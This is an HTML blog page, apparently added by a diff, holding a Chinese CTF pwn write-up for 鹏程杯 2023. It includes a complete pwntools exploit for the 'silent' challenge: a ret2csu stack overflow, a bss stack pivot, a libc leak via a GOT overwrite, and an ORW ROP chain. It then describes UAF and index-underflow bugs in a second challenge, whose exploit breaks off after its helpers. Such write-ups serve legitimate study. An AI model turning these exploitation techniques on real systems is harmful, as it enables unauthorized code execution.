@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>鹏程杯 - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+CTF PWN
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="鹏程杯" />
+<meta property="og:description" content="
+CTF PWN
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/%E9%B9%8F%E7%A8%8B%E6%9D%AF-ctf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-11-04T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="鹏程杯"/>
+<meta name="twitter:description" content="
+CTF PWN
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">鹏程杯</h1>
+			<div class="meta">Posted on Nov 4, 2023</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>CTF PWN</p>
+</blockquote>
+<p>调试时去除alarm函数：使用16进制编辑器，将所有的alarm改成 <code>isnan</code></p>
+<p>或者使用命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i s/alarm/isnan/g &lt;二进制文件&gt;
+</span></span></code></pre></div><h2 id="slient">slient</h2>
+<p>开启PIE和NX保护，漏洞点是一个栈溢出。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">64</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-40h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  init_seccomp(argc, argv, envp);
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0LL</span>);
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0LL</span>);
+</span></span><span style="display:flex;"><span>  read(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x100uLL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>没有puts，write等可以进行泄露的函数。思路为将某些函数的got表读入bss段，使用ret2csu。</p>
+<ul>
+<li>读got表需要gadget至少存在可以修改地址内容片段，形如 <code>mov [xxx], xxx</code> 。用于取值，而且需要我们可以控制寄存器的内容</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ROPgadget --binary silent
+</span></span><span style="display:flex;"><span>0x00000000004007e8 : add dword ptr <span style="color:#ff79c6">[</span>rbp - 0x3d<span style="color:#ff79c6">]</span>, ebx ; nop dword ptr <span style="color:#ff79c6">[</span>rax + rax<span style="color:#ff79c6">]</span> ; repz ret
+</span></span></code></pre></div><ol>
+<li>栈溢出，使用ret2csu，向bss段读入ROP chain。</li>
+<li>栈迁移，转到bss段的ROPchain执行</li>
+</ol>
+<ul>
+<li>使用magic 修改read_got 表内容为syscall</li>
+<li>泄露出libc_base</li>
+<li>继续read ROPchian，栈迁移执行ROPchain</li>
+</ul>
+<p>需要注意</p>
+<ul>
+<li>取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为<strong>负，加0x100000000取补码</strong>。</li>
+<li>控制rax，使用函数返回值是rax来控制</li>
+<li>栈迁移的重点是控制rsp，也可以使用 pop_rsp 直接控制。</li>
+</ul>
+<p>最终的exp</p>
+<ul>
+<li>调试二三十次才明白，<del>但是很快就会忘</del>。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">r</span>(num<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4096</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recv(num)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p): gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;silent_patched&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;DEBUG&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rbp_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400788</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400963</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400961</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400696</span>
+</span></span><span style="display:flex;"><span>leave_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000004008FC</span>
+</span></span><span style="display:flex;"><span>pop_rsp_r13_r14_r15 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000040095d</span>
+</span></span><span style="display:flex;"><span>magic <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004007e8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read_plt <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>plt<span style="color:#ff79c6">.</span>read
+</span></span><span style="display:flex;"><span>read_got <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>read
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>csu_front <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400940</span>
+</span></span><span style="display:flex;"><span>csu_end <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40095A</span>
+</span></span><span style="display:flex;"><span>bss <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>bss()
+</span></span><span style="display:flex;"><span>stdout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x601020</span>
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0400878</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">csu:    0, 1, call, rdi, rsi, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400940 4C 89 FA                      mov     rdx, r15
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400943 4C 89 F6                      mov     rsi, r14
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400946 44 89 EF                      mov     edi, r13d
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400949
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040094D 48 83 C3 01                   add     rbx, 1
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400954 75 EA                         jnz     short loc_400940
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400954
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400956 48 83 C4 08                   add     rsp, 8
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095A 5B                            pop     rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095B 5D                            pop     rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095C 41 5C                         pop     r12
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:000000000040095E 41 5D                         pop     r13
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400960 41 5E                         pop     r14
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400962 41 5F                         pop     r15
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text:0000000000400964 C3                            retn
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">64</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>)
+</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">+=</span> flat([
+</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x800</span>, <span style="color:#bd93f9">0x400</span>,
+</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x800</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    leave_ret
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>s(p1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># bss ROP chain</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 调用bss段的代码，然后最后 pop rbp 给rbp指定一个值，就是 stdout+0x3d</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 调用magic gadget ，[stdout] 内容</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span>
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; x/2xg &amp;stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; p syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$1 = {&lt;text variable, no debug info&gt;} 0x7fc4d7d1b520 &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; x/10wi 0x7fc4d7d1b520
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">   
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pwndbg&gt; p write
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$2 = {&lt;text variable, no debug info&gt;} 0x7fc4d7d100f0 &lt;write&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p2 <span style="color:#ff79c6">=</span> flat([
+</span></span><span style="display:flex;"><span>    stdout<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>,                        <span style="color:#6272a4"># rbp</span>
+</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0x100000000</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x7fc4d7d1b537</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x00007fc4d7fec760</span>, stdout<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    magic,                                                      <span style="color:#6272a4"># 将stdout 改成syscall</span>
+</span></span><span style="display:flex;"><span>    csu_end, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0x1</span>,                <span style="color:#6272a4"># 函数返回值为rax</span>
+</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, stdout, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">8</span>,                 <span style="color:#6272a4"># syscall (1, 1, read_got, 8)。</span>
+</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, read_got, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0x100</span>,         <span style="color:#6272a4"># 读入第二个ROPchian</span>
+</span></span><span style="display:flex;"><span>    csu_front, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    leave_ret                                                   <span style="color:#6272a4"># 迁移到第二个bss_chain</span>
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dbg(p)
+</span></span><span style="display:flex;"><span>s(p2)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>s(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>read
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;libc.address&#34;</span>)
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;bss&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>open_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;open&#39;</span>]
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;read&#39;</span>]
+</span></span><span style="display:flex;"><span>flag_addr <span style="color:#ff79c6">=</span> bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x1000</span>
+</span></span><span style="display:flex;"><span>pop_rdx_ret <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>search(asm(<span style="color:#f1fa8c">&#34;pop rdx; ret&#34;</span>))<span style="color:#ff79c6">.</span>__next__() 
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>search(asm(<span style="color:#f1fa8c">&#34;pop rsi; ret&#34;</span>))<span style="color:#ff79c6">.</span>__next__() 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop_chian <span style="color:#ff79c6">=</span> flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;flag</span><span style="color:#f1fa8c">\x00\x00\x00\x00</span><span style="color:#f1fa8c">&#39;</span>,  <span style="color:#6272a4"># 填充8字节</span>
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, flag_addr, pop_rsi_ret, <span style="color:#bd93f9">0</span>, open_addr,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">3</span>, pop_rsi_ret, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x400</span>, pop_rdx_ret, <span style="color:#bd93f9">0x30</span>, read_addr,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">1</span>, pop_rsi_ret, bss<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x400</span>, pop_rdx_ret, <span style="color:#bd93f9">0x30</span>, write_addr,
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>s(rop_chian)
+</span></span><span style="display:flex;"><span>itr()
+</span></span></code></pre></div><h2 id="atuo_coffee_sale_machine">atuo_coffee_sale_machine</h2>
+<p>coffee_list: 存储咖啡信息。
+两个coffee_left数组，分别是 user 和 admin，是一个 <code>3*7</code> 数组，id和position</p>
+<p>user</p>
+<ul>
+<li>购买，输入id，按照pos顺序进行free</li>
+<li>查看，打印出 coffee_list 信息</li>
+</ul>
+<p>admin</p>
+<ul>
+<li>replenish：先更新admin coffee_list，然后更新 user coffee_left</li>
+<li>change_default，输入id和pos更新内容，然后更新user coffee_left</li>
+</ul>
+<p>存在两个问题，都可以进行泄露和 get shell</p>
+<ul>
+<li>admin在 change_default 使，没有先进行update，直接read会导致uaf问题</li>
+<li>数组underflow，因为读入的id, pos 没有判断是否小于0。</li>
+</ul>
+<p>exp如下</p>
+<ul>
+<li>由于change_default存在更新，容易导致double free 和 无法  replenish 的错误，我们需要中途更新一下admin coffee_left。（<del>菜鸡的眼泪</del></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sa</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendafter(delim, data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sla</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendlineafter(delim, data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
